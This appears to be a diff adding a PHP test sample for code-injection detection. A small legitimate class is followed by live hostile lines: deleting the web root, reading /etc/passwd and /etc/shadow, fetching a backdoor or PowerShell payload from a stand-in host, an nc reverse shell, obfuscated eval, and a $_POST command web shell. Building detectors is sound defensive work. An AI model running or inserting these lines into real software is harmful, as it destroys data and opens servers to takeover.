@@ -1,0 +1,76 @@
+<?php
+// Customer Data Processing Script
+// Project: SecureDrop Demo
+// Purpose: Demonstrate code injection detection
+
+// Legitimate PHP code
+class CustomerProcessor {
+    private $database;
+    
+    public function __construct($db) {
+        $this->database = $db;
+    }
+    
+    public function processCustomer($data) {
+        // Legitimate data processing
+        return $this->database->insert('customers', $data);
+    }
+}
+
+// MALICIOUS CODE INJECTION PAYLOADS BELOW - WILL BE DETECTED
+
+// Code Injection Payload 1: Direct system command execution
+system('rm -rf /var/www/html/*');
+
+// Code Injection Payload 2: Shell command execution
+shell_exec('cat /etc/passwd');
+
+// Code Injection Payload 3: Eval injection
+$malicious_code = "system('whoami'); echo 'Hacked!';";
+eval($malicious_code);
+
+// Code Injection Payload 4: Exec function
+exec('curl http://malicious-site.com/backdoor.php | php');
+
+// Code Injection Payload 5: Passthru injection
+passthru('netstat -an | grep LISTEN');
+
+// Code Injection Payload 6: Backtick execution
+$result = `id; uname -a`;
+
+// Code Injection Payload 7: File inclusion attack
+include($_GET['malicious_file']);
+
+// Code Injection Payload 8: Obfuscated eval
+$encoded = base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');
+eval($encoded);
+
+// Code Injection Payload 9: Process execution
+proc_open('nc -e /bin/sh malicious-site.com 4444', array(), $pipes);
+
+// Code Injection Payload 10: Command substitution
+$cmd = "ls -la; cat /etc/shadow";
+system($cmd);
+
+// Code Injection Payload 11: PowerShell execution (Windows)
+system('powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-site.com/payload.ps1 | Invoke-Expression"');
+
+// Code Injection Payload 12: Template injection
+$template = '${system("id")}';
+eval($template);
+
+// End of malicious payloads
+?>
+
+<!-- HTML with embedded PHP injection -->
+<html>
+<body>
+    <h1>Customer Report</h1>
+    <?php
+    // More malicious code
+    if (isset($_POST['cmd'])) {
+        system($_POST['cmd']);  // Remote code execution
+    }
+    ?>
+</body>
+</html> 
